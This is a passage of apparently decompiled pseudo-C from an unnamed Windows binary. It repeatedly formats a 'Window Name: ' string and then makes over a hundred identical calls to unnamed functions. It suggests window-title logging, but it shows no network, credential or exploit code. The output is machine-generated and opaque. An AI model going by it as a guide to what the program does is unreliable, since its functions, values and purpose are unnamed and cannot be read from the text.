uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar12 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar12, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar15, uVar16, uVar17, uVar12, uVar13, uVar14\n                 , uVar9);\n    uVar9 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar9, uVar10, uVar11, uVar8, uVar6, uVar15, uVar16\n                 , uVar17);\n    uVar17 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar16 = 4;\n    uVar15 = 0;\n    uVar6 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar6, uVar15, uVar16, uVar17, uVar12, uVar13, uVar14, uVar9, uVar10, uVar11\n                 , uVar8);\n    fcn.00402920(10);\n    fcn.00401da0();\n    (*pcVar2)(0, 0, 4);\n    fcn.00402580(0x450d00, \"Window Name: \", in_stack_000003e0, in_stack_000003e4, in_stack_000003e8, in_stack_000003ec, \n                 in_stack_000003f0, in_stack_000003f4, in_stack_000003f8, in_stack_000003fc, in_stack_00000400, \n                 in_stack_00000404, in_stack_00000408);\n    fcn.00402920();\n    fcn.00401da0();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    uStack4 = 0;\n    uStack8 = 0x406eda;\n    fcn.00402d50();\n    uStack8 = 0;\n    uStack12 = 0;\n    uStack16 = 0x406ee3;\n    fcn.00402d50();\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0x406eec;\n    fcn.00402d50();\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0x406ef5;\n    fcn.00402d50();\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0x406efe;\n    fcn.00402d50();\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0x406f07;\n    fcn.00402d50();\n    uStack48 = 0;\n    uStack52 = 0;\n    uStack56 = 0x406f10;\n    fcn.00402d50();\n    uStack56 = 0;\n    uStack60 = 0;\n    uStack64 = 0x406f19;\n    fcn.00402d50();\n    uStack64 = 0;\n    uStack68 = 0;\n    uStack72 = 0x406f22;\n    fcn.00402d50();\n    uStack72 = 0;\n    uStack76 = 0;\n    uStack80 = 0x406f2b;\n    fcn.00402d50();\n    uStack80 = 0;\n    uStack84 = 0;\n    uStack88 = 0x406f34;\n    fcn.00402d50();\n    uStack88 = 0;\n    uStack92 = 0;\n    uStack96 = 0x406f3d;\n    fcn.00402d50();\n    uStack96 = 0;\n    uStack100 = 0;\n    uStack104 = 0x406f46;\n    fcn.00402d50();\n    uStack104 = 0;\n    uStack108 = 0;\n    uStack112 = 0x406f4f;\n    fcn.00402d50();\n    uStack112 = 0;\n    uStack116 = 0;\n    uStack120 = 0x406f58;\n    fcn.00402d50();\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack128 = 0x406f61;\n    fcn.00402d50();\n    uStack128 = 0;\n    uStack132 = 0;\n    uStack136 = 0x406f6a;\n    fcn.00402d50();\n    uStack136 = 0;\n    uStack140 = 0;\n    uStack144 = 0x406f73;\n    fcn.00402d50();\n  